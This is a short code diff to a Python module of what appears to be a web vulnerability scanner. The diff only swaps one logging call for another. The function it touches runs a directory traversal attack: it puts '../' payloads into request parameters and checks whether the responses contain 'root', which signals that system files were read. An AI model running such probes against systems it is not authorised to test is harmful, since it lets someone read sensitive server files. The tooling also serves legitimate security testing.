@@ -10,7 +10,7 @@ NOTE: unix only
 import requests
 
 from modules.http import execute_request
-from modules.logger import cprint
+from modules.logger import logger
 
 
 dots = "../"
@@ -21,15 +21,15 @@ common_check = ["root","boh","boh2"]
 Executes directory traversal attack
 """
 def execute_traversal(s,request,check=common_check,fname=common_files):
-    cprint("Executing directory traversal attack","V")
+    logger.debug("Executing directory traversal attack")
     params = request["params"]
     payloads = __payloadgenerator(fname)
     for park, parv in params.items():
         if parv == "?":
             for idx,p in enumerate(payloads):
                 params[park] = p
-                cprint("trying: "+p,"V")
-                cprint("looking for: "+check[idx%len(check)],"V")
+                logger.debug("trying: "+p)
+                logger.debug("looking for: "+check[idx%len(check)])
                 r = execute_request(s,request)
                 if check[idx%len(check)] in r.text:
                     return True
